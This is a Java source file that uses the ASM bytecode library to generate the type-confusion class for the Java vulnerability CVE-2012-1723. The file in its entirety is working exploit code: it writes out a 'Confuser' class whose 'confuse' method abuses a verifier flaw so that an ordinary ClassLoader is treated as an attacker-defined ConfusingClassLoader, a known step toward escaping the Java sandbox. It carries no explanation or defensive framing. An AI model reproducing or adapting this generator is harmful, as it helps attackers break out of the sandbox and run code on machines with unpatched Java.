package cve1723;

import org.objectweb.asm.*;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.*;
import java.util.Arrays;

import static org.objectweb.asm.Opcodes.*;

/**
 * CVE-2012-1723
 */
public class Generator {
	public static byte[] generateConfusion() {
		final String STATIC_FIELD_NAME = "staticTypeA";
		final String INSTANCE_FIELD_NAME = "instanceTypeB";
		final String CONFUSE_METHOD_NAME = "confuse";
		final String CONFUSER_CLASS_NAME = "cve1723/Confuser";

		final String TYPE_A = "Ljava/lang/ClassLoader;";
		final String TYPE_B = "Lcve1723/ConfusingClassLoader;";

		final ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);

		MethodVisitor mv = null;
		FieldVisitor fv = null;

		cw.visit(V1_5, ACC_PUBLIC | ACC_SUPER, CONFUSER_CLASS_NAME, null, "java/lang/Object", null);

		// static field of type A (ClassLoader)
		{
			fv = cw.visitField(ACC_STATIC, STATIC_FIELD_NAME, TYPE_A, null, null);
			fv.visitEnd();
		}

		// one hundred fields of type B (ConfusingClassLoader)
		{
			for (int i = 0; i < 100; i++) {
				fv = cw.visitField(ACC_PUBLIC, INSTANCE_FIELD_NAME + i, TYPE_B, null, null);
				fv.visitEnd();
			}
		}

		// constructor
		{
			mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, null);
			mv.visitCode();
			mv.visitVarInsn(ALOAD, 0);
			mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V");
			mv.visitInsn(RETURN);
			mv.visitMaxs(0, 0);
			mv.visitEnd();
		}

		// confuse method
		{
			mv = cw.visitMethod(ACC_PUBLIC, CONFUSE_METHOD_NAME, "(" + TYPE_A + ")" + TYPE_B, null, null);
			mv.visitCode();
			/*
				aload 1		 // push parameter onto stack
				ifnonnull cont:
				aconst_null
				areturn		  // quick return
			cont:
				getstatic STATIC_FIELD_NAME
				pop
				aload 0
				aload 1
				putfield STATIC_FIELD_NAME // force this into a non-static field

				// find instance field that's not null
				aload 0
				getfield INSTANCE_FIELD_NAME_1
				ifnull cont2:
				aload 0
				getfield INSTANCE_FIELD_NAME_1
				areturn
			cont2:
				...

				aconst_null
				areturn
			 */

			// first part
			mv.visitVarInsn(ALOAD, 1);
			final Label cont = new Label();
			mv.visitJumpInsn(IFNONNULL, cont);
			mv.visitInsn(ACONST_NULL);
			mv.visitInsn(ARETURN);
			mv.visitLabel(cont);

			// 2nd part
			mv.visitFieldInsn(GETSTATIC, CONFUSER_CLASS_NAME, STATIC_FIELD_NAME, TYPE_A);
			mv.visitInsn(POP);
			mv.visitVarInsn(ALOAD, 0);
			mv.visitVarInsn(ALOAD, 1);
			mv.visitFieldInsn(PUTFIELD, CONFUSER_CLASS_NAME, STATIC_FIELD_NAME, TYPE_A);

			for (int i = 0; i < 100; i++) {
				mv.visitVarInsn(ALOAD, 0);
				mv.visitFieldInsn(GETFIELD, CONFUSER_CLASS_NAME, INSTANCE_FIELD_NAME + i, TYPE_B);
				final Label contN = new Label();
				mv.visitJumpInsn(IFNULL, contN);
				mv.visitVarInsn(ALOAD, 0);
				mv.visitFieldInsn(GETFIELD, CONFUSER_CLASS_NAME, INSTANCE_FIELD_NAME + i, TYPE_B);
				mv.visitInsn(ARETURN);
				mv.visitLabel(contN);
			}

			mv.visitInsn(ACONST_NULL);
			mv.visitInsn(ARETURN);

			mv.visitMaxs(0, 0);
			mv.visitEnd();
		}
		cw.visitEnd();

		return cw.toByteArray();
	}

	public static void main(final String args[]) throws Exception {
		final byte data[] = Generator.generateConfusion();
		final FileOutputStream fo = new FileOutputStream("Confuser.class");
		fo.write(data);
		fo.close();
	}
}
